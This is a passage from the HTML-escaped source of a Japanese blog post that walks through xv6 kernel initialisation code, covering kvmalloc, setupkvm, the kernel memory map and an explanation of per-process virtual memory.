  &lt;span class=&quot;token function&quot;&gt;lapicinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;token comment&quot;&gt;// interrupt controller&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;seginit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// segment descriptors&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;picinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// disable pic&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ioapicinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;token comment&quot;&gt;// another interrupt controller&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;consoleinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// console hardware&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;uartinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// serial port&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;pinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// process table&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;tvinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// trap vectors&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;binit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// buffer cache&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;fileinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// file table&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ideinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// disk &lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;startothers&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// start other processors&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;kinit2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// must come after startothers()&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;userinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// first user process&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;mpmain&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// finish this processor&apos;s setup&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-004-kernel-main-01&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;関数が終了するところまで進めたので、今回は&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数から見ていきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;vm.c&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Allocate one page table for the machine for the kernel address&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// space for scheduler processes.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;kvmalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  kpgdir &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setupkvm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;switchkvm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数はカーネルのページテーブルを変更します。&lt;/p&gt;
&lt;p&gt;ここで、カーネルがプロセスのアドレス空間を管理するための設計を持ったページテーブルに切り替えます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;P.30 xv6OS&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;なお、xv6OSではプロセスごとに1つのページテーブルが作成され、プロセスの実行時にはカーネルは現在のプロセスのページテーブルを使用します。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;kpgdir&lt;/code&gt;というCPUが実行していないプロセスを管理するページテーブルが用意されています。&lt;/p&gt;
&lt;h3 id=&quot;仮想メモリについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;仮想メモリについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;仮想メモリについて&lt;/h3&gt;
&lt;p&gt;xv6OSだけでなく、WindowsやLinuxなどの32bitOS(x86アーキテクチャ)では、プロセスごとに仮想メモリというプライベートなメモリ空間が割り当てられます。&lt;/p&gt;
&lt;p&gt;各プロセスごとの仮想アドレス空間は独立しているため、それぞれが任意のアドレスから2GiB分の仮想アドレスを指定してメモリアクセスを行うことができます。&lt;/p&gt;
&lt;p&gt;(プロセス側があるアドレスの参照を行ったときに、実際に物理メモリのどのアドレスを参照することになるかは、カーネル側で管理します。)&lt;/p&gt;
&lt;p&gt;この仕組みによって、ページングを行っていてもプロセスは常に仮想アドレスに対してメモリアクセスを行うことができるため、アプリケーション側は物理メモリのアドレス変更を考慮することなく開発することができます。&lt;/p&gt;
&lt;p&gt;また、32bitOSは最大4GiBまでのアドレス空間しか管理することができません。&lt;/p&gt;
&lt;p&gt;しかし、プロセスごとに仮想アドレス空間を作成しページングの仕組みを利用することで、実際よりも大きなメモリ空間を利用してシステムを動かすことができるようになります。&lt;/p&gt;
&lt;p&gt;そのほかにも、プロセス間でメモリ空間が独立していることによってメモリの競合を防いだりやアクセス制御を行ったりすることもできます。&lt;/p&gt;
&lt;p&gt;ちなみに、なぜ32bitOSの扱うことができるアドレス空間が最大4GiBなのに、仮想アドレス空間は2GiBなのかというと、上位2GiBはカーネルに予約されているためのようです。&lt;/p&gt;
&lt;p&gt;詳しくは以下の図が参考になります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 454px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/b3c1d/image-20.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 97.91666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsTAAALEwEAmpwYAAACxElEQVQ4y42Ui5KaQBBF/f/fSmpTlY1bRkVBUQFBXsLwBhG56Z5diG4eu1S1DjBz5/TtHiZ93+P9laYxyqp4eDbM+9v8+2vCP9driziO4fsRPK+EZcVwnAxBUCMMC3RdN4p9SvB1cgfTDKGqDRZzgdkswnJZ0L1AkohPU05utxstSJBlKXTdgaZVFAXWao7NpsZKCYjUfyD8r2BPgmVZUhSUpsBiIfDy4slgyv0+R12XlPbtU5ST+5swLKXgdEqCU5dSTsnPmjbLpY+czUdeTu5fum5CnpUPKW+3CRFWVLiO4voh5ZsgaPcOp5MgH1siE5jPz9jtOykYhoFcfLlc/qB8Lz4ZBpdLI4uyXCbSv+dnB4qSUfhwvRMJ9Wjb9oHyfYwe8s5dd6WixJLu6emAL191LJUU63UoO4CFhviXf/x80suTkUKIGMYhgLpuKEqoqxJbrYVGfZimiaxy0zQoikIC1FVFAA7yvJBCgxWSMM9zROcQumFBO9K/E8nY2hSmizzL5OSK2uschvJUVSQohJBr67qWm90dPUrlQikLG4duC7PbvUa/g1UZqIpKTmY6FuK+5awMw6A+3eN8Pkt/X1O+8yMofBxh4QSHwn6NxiaySi4Ig0CmyQJMxXQZ0XPwZiPhIGpHR6j5CiuxxDpRaKxgl+ioy3r8QPDF6TGZrus4Ho+wbVtS/+5D9COhQaka7Z5SPtB4D7u20F5a+T6KIknn+75MmQnZLi4SW/HgYSIS7NwdlGSBeTDD1HmGIhbYhCq9SzHMY1ImZCIuDsdQ+VGQT0ld1bBCE1qxxsx7wbf9E1apgm2kwXd9KeS5LjW5N1aWv1IsxuOR8D5lL3OxaVQs45/4cfoOrVbJwy0VI5Q+B1QUl0RZiAXYO37GxA+CkpIOv3kyYcYH7HwdmqPCoLEdWUiTFEMvcEN7b5QsxsHjoSi/ABqT/23sEaz0AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/8ac56/image-20.webp 240w,
/static/bda5ce08cfe2ad1e3267f7b9bcef994f/44d9f/image-20.webp 454w&quot;
              sizes=&quot;(max-width: 454px) 100vw, 454px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/8ff5a/image-20.png 240w,
/static/bda5ce08cfe2ad1e3267f7b9bcef994f/b3c1d/image-20.png 454w&quot;
            sizes=&quot;(max-width: 454px) 100vw, 454px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/bda5ce08cfe2ad1e3267f7b9bcef994f/b3c1d/image-20.png&quot;
            alt=&quot;img&quot;
            title=&quot;img&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;P.31 xv6OS&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;setupkvm関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#setupkvm%E9%96%A2%E6%95%B0&quot; aria-label=&quot;setupkvm関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;setupkvm関数&lt;/h3&gt;
&lt;p&gt;とりあえず&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数の処理を追ってみます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kpgdir = setupkvm();&lt;/code&gt;の行では、&lt;code class=&quot;language-text&quot;&gt;setupkvm&lt;/code&gt;関数の戻り値を&lt;code class=&quot;language-text&quot;&gt;pde_t&lt;/code&gt;型の&lt;code class=&quot;language-text&quot;&gt;kpgdir&lt;/code&gt;に格納しています。&lt;/p&gt;
&lt;p&gt;ちなみに、&lt;code class=&quot;language-text&quot;&gt;pde_t&lt;/code&gt;型は&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;で以下のように定義されており、&lt;code class=&quot;language-text&quot;&gt;uint&lt;/code&gt;型であることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;typedef&lt;/span&gt; uint &lt;span class=&quot;token class-name&quot;&gt;pte_t&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;setupkvm&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;vm.c&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Set up kernel part of a page table.&lt;/span&gt;
&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setupkvm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;kmap&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;k&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;kalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;PHYSTOP&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;DEVSPACE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;PHYSTOP too high&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;k &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; kmap&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; k &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmap&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;NELEM&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;kmap&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mappages&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;virt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_end &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;phys_start&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; k&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;perm&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; 
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;freevm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; pgdir&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まずは変数宣言の部分です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token class-name&quot;&gt;pde_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;pgdir&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;kmap&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;k&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;pde_t&lt;/code&gt;は前述の通り&lt;code class=&quot;language-text&quot;&gt;uint&lt;/code&gt;と同義です。&lt;/p&gt;
&lt;p&gt;次の&lt;code class=&quot;language-text&quot;&gt;kmap&lt;/code&gt;構造体は&lt;code class=&quot;language-text&quot;&gt;vm.c&lt;/code&gt;で定義されているカーネルのメモリマッピングテーブルです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// This table defines the kernel&apos;s mappings, which are present in&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// every process&apos;s page table.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;kmap&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;virt&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint phys_start&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint phys_end&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; perm&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; kmap&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
